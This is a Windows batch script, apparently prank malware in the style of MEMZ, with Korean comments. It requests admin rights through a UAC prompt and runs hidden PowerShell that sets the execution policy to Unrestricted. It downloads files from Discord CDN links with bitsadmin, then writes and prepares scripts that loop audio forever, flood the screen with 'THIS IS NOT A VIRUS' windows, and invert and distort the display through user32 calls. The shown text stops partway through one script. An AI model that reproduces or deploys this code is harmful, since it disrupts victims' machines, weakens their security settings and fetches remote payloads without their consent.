@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
PowerShell.exe -NoProfile -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
cd %appdata%
del /F /Q ren
md ren
cd %appdata%\ren\
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1099649782877798400/error.png "%appdata%\ren\error.png"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1112696250312175646/pngegg_1.png "%appdata%\ren\heysmile.jpg"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1112696916237615204/pngegg_2.png "%appdata%\ren\bit.png"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1113026587357630464/THISISNOTVIRUS.mp3 "%appdata%\ren\THISISNOTVIRUS.mp3"
echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                          >> benben.ps1
echo # 폼 생성                                                                                                               >> benben.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                         >> benben.ps1
echo $form.WindowState = 'Maximized'                                                                                      >> benben.ps1
echo $form.FormBorderStyle = 'None'                                                                                       >> benben.ps1
echo # 폼 배경색을 투명색으로 변경                                                                                                    >> benben.ps1
echo $form.BackColor = 'Transparent'                                                                                      >> benben.ps1
echo # 폼 배경을 투명하게 만듦                                                                                                      >> benben.ps1
echo $form.Opacity = 0                                                                                                    >> benben.ps1
echo # 미디어 플레이어 생성                                                                                                        >> benben.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                           >> benben.ps1
echo $mediaPlayer.Open("$env:appdata\ren\THISISNOTVIRUS.mp3")                                                                     >> benben.ps1
echo $mediaPlayer.Play()                                                                                                  >> benben.ps1
echo # WPF 호스팅을 위한 WindowsFormsHost 컨트롤 생성                                                                                >> benben.ps1
echo $host = New-Object WindowsFormsHost                                                                                  >> benben.ps1
echo $host.Dock = 'Fill'                                                                                                  >> benben.ps1
echo # 미디어 플레이어 컨트롤 생성                                                                                                    >> benben.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                      >> benben.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                  >> benben.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                    >> benben.ps1
echo # WindowsFormsHost에 미디어 플레이어 컨트롤 추가                                                                                  >> benben.ps1
echo $host.Child = $mediaElement                                                                                          >> benben.ps1
echo # 폼에 WindowsFormsHost 컨트롤 추가                                                                                         >> benben.ps1
echo $form.Controls.Add($host)                                                                                            >> benben.ps1
echo # 폼 실행                                                                                                               >> benben.ps1
echo $null = $form.ShowDialog()                                                                                           >> benben.ps1
echo # PowerShell 창이 꺼지지 않도록 한다                                                                                           >> benben.ps1
echo while ($true) {                                                                                                      >> benben.ps1
echo     # 誘몃뵒???뚮젅?댁뼱媛 醫낅즺?섎㈃ ?ㅼ떆 ?ъ깮?쒕떎                                                                      >> benben.ps1                   
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {       >> benben.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                               >> benben.ps1
echo         $mediaPlayer.Play()                                                                                          >> benben.ps1
echo     }                                                                                                                >> benben.ps1
echo }                                                                                                                    >> benben.ps1



echo Add-Type -AssemblyName System.Windows.Forms                                                                          > error.ps1
echo Add-Type -AssemblyName System.Drawing                                                                                        >> error.ps1
echo while($true) {                                                                                                               >> error.ps1
echo     $imgPath = "$env:APPDATA\ren\heysmile.jpg"                                                                                 >> error.ps1
echo     $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                   >> error.ps1
echo     $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::AutoSize                                                >> error.ps1
echo     $pictureBox.Image = [System.Drawing.Image]::FromFile($imgPath)                                                             >> error.ps1
echo     $form = New-Object System.Windows.Forms.Form                                                                               >> error.ps1
echo     $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                       >> error.ps1
echo     $form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual                                                     >> error.ps1
echo     $form.Size = New-Object System.Drawing.Size(1, 90)                                                                      >> error.ps1
echo     $form.Controls.Add($pictureBox)                                                                                            >> error.ps1
echo     $form.TopMost = $true                                                                                                      >> error.ps1
echo     $form.Show()                                                                                                               >> error.ps1
echo     while($form.Visible) {                                                                                                     >> error.ps1
echo         $form.Left = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - $form.Width)  >> error.ps1
echo         $form.Top = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - $form.Height) >> error.ps1
echo         Start-Sleep -Milliseconds 100                                                                                          >> error.ps1
echo     }                                                                                                                          >> error.ps1
echo }                                                                                                                              >> error.ps1
echo MsgBox "hey bro!!  this is not a virus ", vbCritical, "this is not a virus" > THISISNOTVIRUS.vbs
echo Add-Type -TypeDefinition @^"                                                                                                                                        > FAKEMEMZ.ps1
echo using System;                                                                                                                                                       >> FAKEMEMZ.ps1
echo using System.Runtime.InteropServices;                                                                                                                               >> FAKEMEMZ.ps1
echo public class DisplaySettingsInvertRect {                                                                                                                            >> FAKEMEMZ.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> FAKEMEMZ.ps1
echo     public static extern bool InvertRect(IntPtr hDC, ref RECT lprc);                                                                                                >> FAKEMEMZ.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                                                                                                           >> FAKEMEMZ.ps1
echo     public struct RECT {                                                                                                                                            >> FAKEMEMZ.ps1
echo         public int Left, Top, Right, Bottom;                                                                                                                        >> FAKEMEMZ.ps1
echo     }                                                                                                                                                               >> FAKEMEMZ.ps1
echo }                                                                                                                                                                   >> FAKEMEMZ.ps1
echo ^"@                                                                                                                                                                 >> FAKEMEMZ.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                        >> FAKEMEMZ.ps1
echo using System;                                                                                                                                                       >> FAKEMEMZ.ps1
echo using System.Runtime.InteropServices;                                                                                                                               >> FAKEMEMZ.ps1
echo public class DisplaySettingsSetWindowPos {                                                                                                                          >> FAKEMEMZ.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> FAKEMEMZ.ps1
echo     public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);                                         >> FAKEMEMZ.ps1
echo     public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);                                                                                                    >> FAKEMEMZ.ps1
echo     public const uint SWP_NOSIZE = 0x0001;                                                                                                                          >> FAKEMEMZ.ps1
echo     public const uint SWP_NOMOVE = 0x0002;                                                                                                                          >> FAKEMEMZ.ps1
echo     public const uint SWP_NOZORDER = 0x0004;                                                                                                                        >> FAKEMEMZ.ps1
echo     public const uint SWP_FRAMECHANGED = 0x0020;                                                                                                                    >> FAKEMEMZ.ps1
echo }                                                                                                                                                                   >> FAKEMEMZ.ps1
echo ^"@                                                                                                                                                                 >> FAKEMEMZ.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                        >> FAKEMEMZ.ps1
echo using System;                                                                                                                                                       >> FAKEMEMZ.ps1
echo using System.Runtime.InteropServices;                                                                                                                               >> FAKEMEMZ.ps1
echo public class DisplaySettingsSetProcessDPIAware {                                                                                                                    >> FAKEMEMZ.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> FAKEMEMZ.ps1
echo     public static extern bool SetProcessDPIAware();                                                                                                                 >> FAKEMEMZ.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> FAKEMEMZ.ps1
echo     public static extern int SetDisplayConfig(uint numPathArrayElements, IntPtr pathArray, uint numModeInfoArrayElements, IntPtr modeInfoArray, uint flags);        >> FAKEMEMZ.ps1
echo }                                                                                                                                                                   >> FAKEMEMZ.ps1
echo ^"@                                                                                                                                                                 >> FAKEMEMZ.ps1
echo Add-Type -AssemblyName System.Windows.Forms                                                                                                                         >> FAKEMEMZ.ps1
echo $iterations = 1                                                                                                                                                     >> FAKEMEMZ.ps1
echo $mirrorEffectDuration = 1  # 거울 효과 지속 시간 (밀리초)                                                                                                                      >> FAKEMEMZ.ps1
echo while ($true) {                                                                                                                                                     >> FAKEMEMZ.ps1
echo     $rect = New-Object DisplaySettingsInvertRect+RECT                                                                                                               >> FAKEMEMZ.ps1
echo     $rect.Left = 0                                                                                                                                                  >> FAKEMEMZ.ps1
echo     $rect.Top = 0                                                                                                                                                   >> FAKEMEMZ.ps1
echo     $rect.Right = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width                                                                                     >> FAKEMEMZ.ps1
echo     $rect.Bottom = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height                                                                                   >> FAKEMEMZ.ps1
echo     $hDC = [System.IntPtr]::Zero                                                                                                                                    >> FAKEMEMZ.ps1
echo     $hDC = [System.Drawing.Graphics]::FromHwnd([System.IntPtr]::Zero).GetHdc()                                                                                      >> FAKEMEMZ.ps1
echo     for ($i = 1; $i -le $iterations; $i++) {                                                                                                                        >> FAKEMEMZ.ps1
echo         # 색상 반전                                                                                                                                                     >> FAKEMEMZ.ps1
echo         [DisplaySettingsInvertRect]::InvertRect($hDC, [ref]$rect)                                                                                                   >> FAKEMEMZ.ps1
echo         # 화면 이동                                                                                                                                                     >> FAKEMEMZ.ps1
echo         $hWnd = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle                                                                                  >> FAKEMEMZ.ps1
echo         [DisplaySettingsSetWindowPos]::SetWindowPos($hWnd, [DisplaySettingsSetWindowPos]::HWND_TOPMOST, 0, 0, 0, 0, [DisplaySettingsSetWindowPos]::SWP_NOMOVE -bor [DisplaySettingsSetWindowPos]::SWP_NOSIZE -bor [DisplaySettingsSetWindowPos]::SWP_NOZORDER -bor [DisplaySettingsSetWindowPos]::SWP_FRAMECHANGED) >> FAKEMEMZ.ps1
echo         # 화면 반전                                                                                                                                                     >> FAKEMEMZ.ps1
echo         [DisplaySettingsSetProcessDPIAware]::SetProcessDPIAware()                                                                                                   >> FAKEMEMZ.ps1
echo         $DISPLAYCONFIG_PATH_INFO_NONE = 0x00000000                                                                                                                  >> FAKEMEMZ.ps1
echo         $DISPLAYCONFIG_MODE_INFO_NONE = 0x00000000                                                                                                                  >> FAKEMEMZ.ps1
echo         $SDC_APPLY = 0x00000080                                                                                                                                     >> FAKEMEMZ.ps1
echo         [DisplaySettingsSetProcessDPIAware]::SetDisplayConfig(0, [IntPtr]::Zero, 0, [IntPtr]::Zero, $SDC_APPLY)                                                     >> FAKEMEMZ.ps1
echo         # 거울 효과                                                                                                                                                     >> FAKEMEMZ.ps1
echo         $reflection = [System.Math]::Sin(($i * [System.Math]::PI) / ($mirrorEffectDuration / 2))                                                                    >> FAKEMEMZ.ps1
echo         $reflection = [System.Math]::Max($reflection, 0)                                                                                                            >> FAKEMEMZ.ps1
echo         $reflection = [System.Math]::Min($reflection, 1)                                                                                                            >> FAKEMEMZ.ps1
echo         # 화면 크기에 대한 거울 효과 적용                                                                                                                                        >> FAKEMEMZ.ps1
echo         $rect.Left = [System.Math]::Round((([System.Windows.Forms.SystemInformation]::VirtualScreen.Width - $rect.Left) * $reflection) + $rect.Left)                >> FAKEMEMZ.ps1
echo         $rect.Right = [System.Math]::Round((([System.Windows.Forms.SystemInformation]::VirtualScreen.Width - $rect.Right) * $reflection) + $rect.Right)             >> FAKEMEMZ.ps1
echo         $rect.Top = [System.Math]::Round((([System.Windows.Forms.SystemInformation]::VirtualScreen.Height - $rect.Top) * $reflection) + $rect.Top)                  >> FAKEMEMZ.ps1
echo         $rect.Bottom = [System.Math]::Round((([System.Windows.Forms.SystemInformation]::VirtualScreen.Height - $rect.Bottom) * $reflection) + $rect.Bottom)         >> FAKEMEMZ.ps1
echo         [DisplaySettingsInvertRect]::InvertRect($hDC, [ref]$rect)                                                                                                   >> FAKEMEMZ.ps1
echo         # 분산 효과                                                                                                                                                     >> FAKEMEMZ.ps1
echo         $distortionAmount = 2000  # 분산 효과 정도                                                                                                                        >> FAKEMEMZ.ps1
echo         $distortedRect = $rect                                                                                                                                      >> FAKEMEMZ.ps1
echo         $distortedRect.Left += Get-Random -Minimum -$distortionAmount -Maximum $distortionAmount                                                                    >> FAKEMEMZ.ps1
echo         $distortedRect.Top += Get-Random -Minimum -$distortionAmount -Maximum $distortionAmount                                                                     >> FAKEMEMZ.ps1
echo         $distortedRect.Right += Get-Random -Minimum -$distortionAmount -Maximum $distortionAmount                                                                   >> FAKEMEMZ.ps1
echo         $distortedRect.Bottom += Get-Random -Minimum -$distortionAmount -Maximum $distortionAmount                                                                  >> FAKEMEMZ.ps1
echo         [DisplaySettingsInvertRect]::InvertRect($hDC, [ref]$distortedRect)                                                                                          >> FAKEMEMZ.ps1
echo         $currentTime = Get-Date                                                                                                                                     >> FAKEMEMZ.ps1
echo     }                                                                                                                                                               >> FAKEMEMZ.ps1
echo     [System.Drawing.Graphics]::FromHdc($hDC).ReleaseHdc()                                                                                                           >> FAKEMEMZ.ps1
echo     # 밝기 및 감마 조절                                                                                                                                                    >> FAKEMEMZ.ps1
echo     $brightness = Get-Random -Minimum 0.5 -Maximum 2  # 밝기 조절 (0.5 ~ 2)                                                                                             >> FAKEMEMZ.ps1
echo     $gamma = Get-Random -Minimum 0.5 -Maximum 2  # 감마 조절 (0.5 ~ 2)                                                                                                  >> FAKEMEMZ.ps1
echo     [System.Windows.Forms.Application]::OpenForms[0].Invoke({                                                                                                       >> FAKEMEMZ.ps1
echo         [System.Windows.Forms.Application]::OpenForms[0].Opacity = $brightness                                                                                      >> FAKEMEMZ.ps1
echo         [System.Windows.Forms.Application]::OpenForms[0].GammaCorrection = $gamma                                                                                   >> FAKEMEMZ.ps1
echo     })                                                                                                                                                              >> FAKEMEMZ.ps1
echo     Start-Sleep -Milliseconds 100  # 1초 대기                                                                                                                          >> FAKEMEMZ.ps1
echo }                                                                                                                                                                   >> FAKEMEMZ.ps1
echo                                                                                                                                                                     >> FAKEMEMZ.ps1

echo Add-Type -AssemblyName System.Windows.Forms >> FAKEMEMZ2.ps1   
echo Add-Type -AssemblyName System.Drawing >> FAKEMEMZ2.ps1   
echo while ($true) { >> FAKEMEMZ2.ps1   
echo     for ($i = 1; $i -le 20; $i++) { >> FAKEMEMZ2.ps1                                       
echo         $form = New-Object System.Windows.Forms.Form                                                                                                                             >> FAKEMEMZ2.ps1
echo         $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                                                                     >> FAKEMEMZ2.ps1
echo         $form.StartPosition = "Manual"                                                                                                                                           >> FAKEMEMZ2.ps1
echo         $form.Top = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - 100)                                                            >> FAKEMEMZ2.ps1
echo         $form.Left = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - 200)                                                            >> FAKEMEMZ2.ps1
echo         $form.Size = New-Object System.Drawing.Size(430, 50)                                                                                                                     >> FAKEMEMZ2.ps1
echo         $form.ShowInTaskbar = $false  # 작업 표시줄에 나타나지 않도록 설정                                                                                                                      >> FAKEMEMZ2.ps1
echo         $label = New-Object System.Windows.Forms.Label                                                                                                                           >> FAKEMEMZ2.ps1
echo         $label.AutoSize = $true                                                                                                                                                  >> FAKEMEMZ2.ps1
echo         $label.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)                                                                           >> FAKEMEMZ2.ps1
echo         $label.ForeColor = [System.Drawing.Color]::FromArgb((Get-Random -Minimum 0 -Maximum 256), (Get-Random -Minimum 0 -Maximum 256), (Get-Random -Minimum 0 -Maximum 256))    >> FAKEMEMZ2.ps1
echo         $label.Text = "THIS IS NOT A VIRUS"                                                                                                                                      >> FAKEMEMZ2.ps1
echo         $form.Controls.Add($label)                                                                                                                                               >> FAKEMEMZ2.ps1
echo         $form.Show()                                                                                                                                                             >> FAKEMEMZ2.ps1
echo     }                                                                                                                                                                            >> FAKEMEMZ2.ps1
echo     $openForms = [System.Windows.Forms.Application]::OpenForms                                                                                                                   >> FAKEMEMZ2.ps1
echo     foreach ($form in $openForms) {                                                                                                                                              >> FAKEMEMZ2.ps1
echo         $form.Close()                                                                                                                                                            >> FAKEMEMZ2.ps1
echo     }                                                                                                                                                                            >> FAKEMEMZ2.ps1
echo }                                                                                                                                                                                >> FAKEMEMZ2.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                    > FAKEMEMZ3.ps1
echo using System;                                                                                                                                                    >> FAKEMEMZ3.ps1
echo using System.Runtime.InteropServices;                                                                                                                            >> FAKEMEMZ3.ps1
echo public class DisplaySettingsInvertRect {                                                                                                                         >> FAKEMEMZ3.ps1
echo     [DllImport("user32.dll")]                                                                                                                                    >> FAKEMEMZ3.ps1
echo     public static extern bool InvertRect(IntPtr hDC, ref RECT lprc);                                                                                             >> FAKEMEMZ3.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                                                                                                        >> FAKEMEMZ3.ps1
echo     public struct RECT {                                                                                                                                         >> FAKEMEMZ3.ps1
echo         public int Left, Top, Right, Bottom;                                                                                                                     >> FAKEMEMZ3.ps1
echo     }                                                                                                                                                            >> FAKEMEMZ3.ps1
echo }                                                                                                                                                                >> FAKEMEMZ3.ps1
echo ^"@                                                                                                                                                              >> FAKEMEMZ3.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                     >> FAKEMEMZ3.ps1
echo using System;                                                                                                                                                    >> FAKEMEMZ3.ps1
echo using System.Runtime.InteropServices;                                                                                                                            >> FAKEMEMZ3.ps1
echo public class DisplaySettingsSetWindowPos {                                                                                                                       >> FAKEMEMZ3.ps1
echo     [DllImport("user32.dll")]                                                                                                                                    >> FAKEMEMZ3.ps1
echo     public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);                                      >> FAKEMEMZ3.ps1
echo }                                                                                                                                                                >> FAKEMEMZ3.ps1
echo ^"@                                                                                                                                                              >> FAKEMEMZ3.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                     >> FAKEMEMZ3.ps1
echo using System;                                                                                                                                                    >> FAKEMEMZ3.ps1
echo using System.Runtime.InteropServices;                                                                                                                            >> FAKEMEMZ3.ps1
echo public class DisplaySettingsSetProcessDPIAware {                                                                                                                 >> FAKEMEMZ3.ps1
echo     [DllImport("user32.dll")]                                                                                                                                    >> FAKEMEMZ3.ps1
echo     public static extern bool SetProcessDPIAware();                                                                                                              >> FAKEMEMZ3.ps1
echo     [DllImport("user32.dll")]                                                                                                                                    >> FAKEMEMZ3.ps1
echo     public static extern int SetDisplayConfig(uint numPathArrayElements, IntPtr pathArray, uint numModeInfoArrayElements, IntPtr modeInfoArray, uint flags);     >> FAKEMEMZ3.ps1
echo }                                                                                                                                                                >> FAKEMEMZ3.ps1
echo ^"@                                                                                                                                                              >> FAKEMEMZ3.ps1
echo Add-Type -AssemblyName System.Drawing                                                                                                                            >> FAKEMEMZ3.ps1
echo Add-Type -AssemblyName System.Windows.Forms                                                                                                                      >> FAKEMEMZ3.ps1
echo $iterations = 1                                                                                                                                                  >> FAKEMEMZ3.ps1
echo $mirrorEffectDuration = 100000  # Mirror effect duration (milliseconds)                                                                                          >> FAKEMEMZ3.ps1
echo while ($true) {                                                                                                                                                  >> FAKEMEMZ3.ps1
echo     $rect = New-Object DisplaySettingsInvertRect+RECT                                                                                                            >> FAKEMEMZ3.ps1
echo     $rect.Left = 0                                                                                                                                               >> FAKEMEMZ3.ps1
echo     $rect.Top = 1000                                                                                                                                             >> FAKEMEMZ3.ps1
echo     $rect.Right = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width                                                                                  >> FAKEMEMZ3.ps1
echo     $rect.Bottom = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height                                                                                >> FAKEMEMZ3.ps1
echo     $hDC = [System.IntPtr]::Zero                                                                                                                                 >> FAKEMEMZ3.ps1
echo     $hDC = [System.Drawing.Graphics]::FromHwnd([System.IntPtr]::Zero).GetHdc()                                                                                   >> FAKEMEMZ3.ps1
echo     for ($i = 1; $i -le $iterations; $i++) {                                                                                                                     >> FAKEMEMZ3.ps1
echo         # Random color inversion                                                                                                                                 >> FAKEMEMZ3.ps1
echo         $red = Get-Random -Minimum 0 -Maximum 250                                                                                                                >> FAKEMEMZ3.ps1
echo         $green = Get-Random -Minimum 0 -Maximum 250                                                                                                              >> FAKEMEMZ3.ps1
echo         $blue = Get-Random -Minimum 0 -Maximum 250                                                                                                               >> FAKEMEMZ3.ps1
echo         $color = [System.Drawing.Color]::FromArgb($red, $green, $blue)                                                                                           >> FAKEMEMZ3.ps1
echo         $brush = [System.Drawing.SolidBrush]::new($color)                                                                                                        >> FAKEMEMZ3.ps1
echo         # Invert color                                                                                                                                           >> FAKEMEMZ3.ps1
echo         $graphics = [System.Drawing.Graphics]::FromHdc($hDC)                                                                                                     >> FAKEMEMZ3.ps1
echo         $graphics.FillRectangle($brush, $rect.Left, $rect.Top, $rect.Right - $rect.Left, $rect.Bottom - $rect.Top)                                               >> FAKEMEMZ3.ps1
echo         $graphics.Dispose()                                                                                                                                      >> FAKEMEMZ3.ps1
echo         [System.Drawing.Graphics]::FromHdc($hDC).ReleaseHdc()                                                                                                    >> FAKEMEMZ3.ps1
echo     }                                                                                                                                                            >> FAKEMEMZ3.ps1
echo }                                                                                                                                                                >> FAKEMEMZ3.ps1
echo                                                                                                                                                                  >> FAKEMEMZ3.ps1


echo Add-Type -TypeDefinition @^"                                                                                                                                                                           > FAKEMEMZ4.ps1
echo using System;                                                                                                                                                                                         >> FAKEMEMZ4.ps1
echo using System.Runtime.InteropServices;                                                                                                                                                                 >> FAKEMEMZ4.ps1
echo public class DisplaySettingsInvertRect {                                                                                                                                                              >> FAKEMEMZ4.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                                         >> FAKEMEMZ4.ps1
echo     public static extern bool InvertRect(IntPtr hDC, ref RECT lprc);                                                                                                                                  >> FAKEMEMZ4.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                                                                                                                                             >> FAKEMEMZ4.ps1
echo     public struct RECT {                                                                                                                                                                              >> FAKEMEMZ4.ps1
echo         public int Left, Top, Right, Bottom;                                                                                                                                                          >> FAKEMEMZ4.ps1
echo     }                                                                                                                                                                                                 >> FAKEMEMZ4.ps1
echo }                                                                                                                                                                                                     >> FAKEMEMZ4.ps1
echo ^"@                                                                                                                                                                                                    >> FAKEMEMZ4.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                                                           >> FAKEMEMZ4.ps1
echo using System;                                                                                                                                                                                         >> FAKEMEMZ4.ps1
echo using System.Runtime.InteropServices;                                                                                                                                                                 >> FAKEMEMZ4.ps1
echo public class DisplaySettingsSetWindowPos {                                                                                                                                                            >> FAKEMEMZ4.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                                         >> FAKEMEMZ4.ps1
echo     public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);                                                                           >> FAKEMEMZ4.ps1
echo }                                                                                                                                                                                                     >> FAKEMEMZ4.ps1
echo ^"@                                                                                                                                                                                                    >> FAKEMEMZ4.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                                                           >> FAKEMEMZ4.ps1
echo using System;                                                                                                                                                                                         >> FAKEMEMZ4.ps1
echo using System.Runtime.InteropServices;                                                                                                                                                                 >> FAKEMEMZ4.ps1
echo public class DisplaySettingsSetProcessDPIAware {                                                                                                                                                      >> FAKEMEMZ4.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                                         >> FAKEMEMZ4.ps1
echo     public static extern bool SetProcessDPIAware();                                                                                                                                                   >> FAKEMEMZ4.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                                         >> FAKEMEMZ4.ps1
echo     public static extern int SetDisplayConfig(uint numPathArrayElements, IntPtr pathArray, uint numModeInfoArrayElements, IntPtr modeInfoArray, uint flags);                                          >> FAKEMEMZ4.ps1
echo }                                                                                                                                                                                                     >> FAKEMEMZ4.ps1
echo ^"@                                                                                                                                                                                                    >> FAKEMEMZ4.ps1
echo Add-Type -AssemblyName System.Windows.Forms                                                                                                                                                           >> FAKEMEMZ4.ps1
echo $iterations = 1                                                                                                                                                                                       >> FAKEMEMZ4.ps1
echo $mirrorEffectDuration = 500  # 거울 효과 지속 시간 (밀리초)                                                                                                                                                      >> FAKEMEMZ4.ps1
echo while ($true) {                                                                                                                                                                                       >> FAKEMEMZ4.ps1
echo     $rect = New-Object DisplaySettingsInvertRect+RECT                                                                                                                                                 >> FAKEMEMZ4.ps1
echo     $rect.Left = 0                                                                                                                                                                                    >> FAKEMEMZ4.ps1
echo     $rect.Top = 0                                                                                                                                                                                     >> FAKEMEMZ4.ps1
echo     $rect.Right = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width                                                                                                                       >> FAKEMEMZ4.ps1
echo     $rect.Bottom = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height                                                                                                                     >> FAKEMEMZ4.ps1
echo     $hDC = [System.IntPtr]::Zero                                                                                                                                                                      >> FAKEMEMZ4.ps1
echo     $hDC = [System.Drawing.Graphics]::FromHwnd([System.IntPtr]::Zero).GetHdc()                                                                                                                        >> FAKEMEMZ4.ps1
echo     for ($i = 1; $i -le $iterations; $i++) {                                                                                                                                                          >> FAKEMEMZ4.ps1
echo         # 색상 반전                                                                                                                                                                                       >> FAKEMEMZ4.ps1
echo         [DisplaySettingsInvertRect]::InvertRect($hDC, [ref]$rect)                                                                                                                                     >> FAKEMEMZ4.ps1
echo         # 화면 이동                                                                                                                                                                                       >> FAKEMEMZ4.ps1
echo         $hWnd = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle                                                                                                                    >> FAKEMEMZ4.ps1
echo         [DisplaySettingsSetWindowPos]::SetWindowPos($hWnd, [IntPtr]::Zero, 0, 0, 0, 0, $SWP_NOMOVE -bor $SWP_NOSIZE)                                                                                  >> FAKEMEMZ4.ps1
echo         # 화면 반전                                                                                                                                                                                       >> FAKEMEMZ4.ps1
echo         [DisplaySettingsSetProcessDPIAware]::SetProcessDPIAware()                                                                                                                                     >> FAKEMEMZ4.ps1
echo         $DISPLAYCONFIG_PATH_INFO_NONE = 0x00000000                                                                                                                                                    >> FAKEMEMZ4.ps1
echo         $DISPLAYCONFIG_MODE_INFO_NONE = 0x00000000                                                                                                                                                    >> FAKEMEMZ4.ps1
echo         $SDC_APPLY = 0x00000080                                                                                                                                                                       >> FAKEMEMZ4.ps1
echo         [DisplaySettingsSetProcessDPIAware]::SetDisplayConfig(0, [IntPtr]::Zero, 0, [IntPtr]::Zero, $SDC_APPLY)                                                                                       >> FAKEMEMZ4.ps1
echo         [DisplaySettingsSetProcessDPIAware]::SetProcessDPIAware()                                                                                                                                     >> FAKEMEMZ4.ps1
echo         [DisplaySettingsSetProcessDPIAware]::SetDisplayConfig(0, [IntPtr]::Zero, 0, [IntPtr]::Zero, $SDC_APPLY)                                                                                       >> FAKEMEMZ4.ps1
echo         # 거울 효과                                                                                                                                                                                       >> FAKEMEMZ4.ps1
echo         $startTime = Get-Date                                                                                                                                                                         >> FAKEMEMZ4.ps1
echo         $currentTime = $startTime                                                                                                                                                                     >> FAKEMEMZ4.ps1
echo         while (($currentTime - $startTime).TotalMilliseconds -le $mirrorEffectDuration) {                                                                                                             >> FAKEMEMZ4.ps1
echo             $reflection = ($currentTime - $startTime).TotalMilliseconds / $mirrorEffectDuration  # 거울 효과 크기 계산                                                                                        >> FAKEMEMZ4.ps1
echo             $reflection = [Math]::Min($reflection, 1)  # 거울 효과 크기 제한 (0 ~ 1)                                                                                                                          >> FAKEMEMZ4.ps1
echo             # 화면 크기에 대한 거울 효과 적용                                                                                                                                                                      >> FAKEMEMZ4.ps1
echo             $rect.Left = [System.Math]::Round((([System.Windows.Forms.SystemInformation]::VirtualScreen.Width - $rect.Left) * $reflection) + $rect.Left)                                              >> FAKEMEMZ4.ps1
echo             $rect.Right = [System.Math]::Round((([System.Windows.Forms.SystemInformation]::VirtualScreen.Width - $rect.Right) * $reflection) + $rect.Right)                                           >> FAKEMEMZ4.ps1
echo             $rect.Top = [System.Math]::Round((([System.Windows.Forms.SystemInformation]::VirtualScreen.Height - $rect.Top) * $reflection) + $rect.Top)                                                >> FAKEMEMZ4.ps1
echo             $rect.Bottom = [System.Math]::Round((([System.Windows.Forms.SystemInformation]::VirtualScreen.Height - $rect.Bottom) * $reflection) + $rect.Bottom)                                       >> FAKEMEMZ4.ps1
echo             [DisplaySettingsInvertRect]::InvertRect($hDC, [ref]$rect)                                                                                                                                 >> FAKEMEMZ4.ps1
echo             $currentTime = Get-Date                                                                                                                                                                   >> FAKEMEMZ4.ps1
